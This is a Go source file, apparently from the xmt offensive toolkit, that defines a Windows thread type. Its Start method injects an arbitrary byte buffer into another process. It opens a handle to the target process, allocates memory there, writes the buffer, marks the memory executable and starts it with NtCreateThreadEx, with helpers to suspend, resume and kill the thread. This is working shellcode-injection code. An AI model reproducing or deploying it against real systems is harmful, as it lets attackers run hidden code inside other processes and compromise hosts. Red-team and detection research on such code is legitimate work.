//go:build windows

package cmd

import (
	"context"
	"sync/atomic"
	"time"

	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/device/winapi"
)

//windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
//	windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE |
//	windows.PROCESS_VM_READ | windows.PROCESS_TERMINATE |
//	windows.PROCESS_DUP_HANDLE | 0x001

type thread struct {
	ctx              context.Context
	err              error
	callback         func()
	ch               chan struct{}
	cancel           context.CancelFunc
	filter           *filter.Filter
	hwnd, loc, owner uintptr
	exit, cookie     uint32
	suspended        bool
}

func (t *thread) wait() {
	var (
		x   = make(chan error)
		err error
	)
	go func() {
		x <- wait(t.hwnd)
		close(x)
	}()
	select {
	case err = <-x:
	case <-t.ctx.Done():
	}
	if err != nil {
		t.stopWith(exitStopped, err)
		return
	}
	if err2 := t.ctx.Err(); err2 != nil {
		t.stopWith(exitStopped, err2)
		return
	}
	err = winapi.GetExitCodeThread(t.hwnd, &t.exit)
	if atomic.StoreUint32(&t.cookie, 2); err != nil {
		t.stopWith(exitStopped, err)
		return
	}
	if t.exit != 0 {
		t.stopWith(t.exit, &ExitError{Exit: t.exit})
		return
	}
	t.stopWith(t.exit, nil)
}
func (t *thread) close() {
	if t.hwnd == 0 || t.owner == 0 {
		return
	}
	if t.loc > 0 {
		winapi.NtFreeVirtualMemory(t.owner, t.loc)
	}
	if t.callback != nil {
		t.callback()
	}
	winapi.CloseHandle(t.hwnd)
	winapi.CloseHandle(t.owner)
	t.hwnd, t.owner, t.loc = 0, 0, 0
}
func (t *thread) kill() error {
	if t.hwnd == 0 {
		return t.err
	}
	t.exit = exitStopped
	return winapi.TerminateThread(t.hwnd, exitStopped)
}
func (t *thread) Pid() uint32 {
	if !t.Running() {
		return 0
	}
	p, _ := winapi.GetProcessID(t.owner)
	return p
}
func (t *thread) Wait() error {
	if t.hwnd == 0 {
		return ErrNotStarted
	}
	<-t.ch
	return t.err
}
func (t *thread) Stop() error {
	if t.hwnd == 0 {
		return nil
	}
	return t.stopWith(exitStopped, t.kill())
}
func (t *thread) Running() bool {
	if t.hwnd == 0 {
		return false
	}
	select {
	case <-t.ch:
		return false
	default:
	}
	return true
}
func (t *thread) Resume() error {
	if !t.Running() || t.hwnd == 0 {
		return ErrNotStarted
	}
	_, err := winapi.ResumeThread(t.hwnd)
	return err
}
func (t *thread) Release() error {
	if atomic.LoadUintptr(&t.hwnd) == 0 {
		return nil
	}
	winapi.CloseHandle(t.hwnd)
	winapi.CloseHandle(t.owner)
	atomic.StoreUint32(&t.cookie, 2)
	return t.stopWith(0, nil)
}
func (t *thread) Suspend() error {
	if !t.Running() || t.hwnd == 0 {
		return ErrNotStarted
	}
	return winapi.SuspendThread(t.hwnd)
}
func (t *thread) SetSuspended(s bool) {
	t.suspended = s
}
func (t *thread) Done() <-chan struct{} {
	return t.ch
}
func (t *thread) Handle() (uintptr, error) {
	if t.hwnd == 0 {
		return 0, ErrNotStarted
	}
	return uintptr(t.hwnd), nil
}
func (t *thread) ExitCode() (int32, error) {
	if t.hwnd > 0 && t.Running() {
		return 0, ErrStillRunning
	}
	return int32(t.exit), nil
}
func (t *thread) Location() (uintptr, error) {
	if t.hwnd == 0 || t.loc == 0 {
		return 0, ErrNotStarted
	}
	return uintptr(t.loc), nil
}
func (t *thread) stopWith(c uint32, e error) error {
	if !t.Running() {
		return e
	}
	if atomic.LoadUint32(&t.cookie) != 1 {
		s := t.cookie
		if atomic.StoreUint32(&t.cookie, 1); t.hwnd > 0 && s != 2 {
			t.kill()
		}
		if err := t.ctx.Err(); s != 2 && err != nil && t.exit == 0 {
			t.err, t.exit = err, c
		}
		t.close()
		close(t.ch)
	}
	if t.cancel(); t.err == nil && t.ctx.Err() != nil {
		if e != nil {
			t.err = e
			return e
		}
		return nil
	}
	return t.err
}
func (t *thread) Start(p uintptr, d time.Duration, a uintptr, b []byte) error {
	if t.Running() {
		return ErrAlreadyStarted
	}
	if len(b) == 0 {
		return ErrEmptyCommand
	}
	if t.ctx == nil {
		t.ctx = context.Background()
	}
	if d > 0 {
		t.ctx, t.cancel = context.WithTimeout(t.ctx, d)
	} else {
		t.cancel = func() {}
	}
	atomic.StoreUint32(&t.cookie, 0)
	if t.ch, t.owner = make(chan struct{}), p; t.owner == 0 {
		t.owner = winapi.CurrentProcess
	}
	var err error
	if t.filter != nil && p == 0 {
		if t.owner, err = t.filter.HandleFunc(0x47B, nil); err != nil {
			return t.stopWith(exitStopped, err)
		}
	}
	l := uint32(len(b))
	if t.loc, err = winapi.NtAllocateVirtualMemory(t.owner, l, 0x4); err != nil {
		return t.stopWith(exitStopped, err)
	}
	if _, err = winapi.NtWriteVirtualMemory(t.owner, t.loc, b); err != nil {
		return t.stopWith(exitStopped, err)
	}
	if a > 0 {
		if protectEnable {
			winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x2)
		}
		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, a, t.loc, t.suspended); err != nil {
			return t.stopWith(exitStopped, err)
		}
	} else {
		if protectEnable {
			winapi.NtProtectVirtualMemory(t.owner, t.loc, l, 0x20)
		}
		if t.hwnd, err = winapi.NtCreateThreadEx(t.owner, t.loc, 0, t.suspended); err != nil {
			return t.stopWith(exitStopped, err)
		}
	}
	return nil
}
